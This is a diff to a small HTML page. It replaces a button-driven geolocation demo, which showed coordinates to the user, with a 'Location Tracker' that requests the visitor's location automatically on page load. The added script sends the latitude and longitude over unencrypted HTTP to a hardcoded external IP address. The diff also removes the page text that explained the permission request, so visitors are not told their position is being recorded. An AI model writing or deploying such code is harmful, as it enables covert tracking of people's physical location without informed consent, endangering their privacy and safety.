@@ -3,45 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation Permission</title>
+    <title>Location Tracker</title>
+    <script>
+        function getLocation() {
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'geolocation' })
+                    .then(permissionStatus => {
+                        if (permissionStatus.state === 'granted') {
+                            saveLocation();
+                        } else if (permissionStatus.state === 'prompt') {
+                            permissionStatus.onchange = () => {
+                                if (permissionStatus.state === 'granted') {
+                                    saveLocation();
+                                }
+                            };
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error getting location permission:', error);
+                    });
+            } else if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(saveLocation, handleLocationError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function saveLocation() {
+            navigator.geolocation.getCurrentPosition(position => {
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+
+                // Send the coordinates to the PHP server
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://144.91.124.232/save_location.php", true);
+                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+                        alert("Location saved successfully!");
+                    }
+                };
+                xhr.send("latitude=" + latitude + "&longitude=" + longitude);
+            }, handleLocationError);
+        }
+
+        function handleLocationError(error) {
+            console.error('Error getting location:', error);
+        }
+
+        // Automatically request location on page load
+        document.addEventListener("DOMContentLoaded", getLocation);
+    </script>
 </head>
 <body>
-
-<script>
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition, showError);
-        } else {
-            alert("Geolocation is not supported by this browser.");
-        }
-    }
-
-    function showPosition(position) {
-        alert("Latitude: " + position.coords.latitude +
-            "\nLongitude: " + position.coords.longitude);
-    }
-
-    function showError(error) {
-        switch (error.code) {
-            case error.PERMISSION_DENIED:
-                alert("User denied the request for geolocation.");
-                break;
-            case error.POSITION_UNAVAILABLE:
-                alert("Location information is unavailable.");
-                break;
-            case error.TIMEOUT:
-                alert("The request to get user location timed out.");
-                break;
-            case error.UNKNOWN_ERROR:
-                alert("An unknown error occurred.");
-                break;
-        }
-    }
-</script>
-
-<h1>Geolocation Permission</h1>
-<p>This page will ask for your permission to access your geolocation.</p>
-<button onclick="getLocation()">Get My Location</button>
-
+    <h1>Location Tracker</h1>
 </body>
 </html>
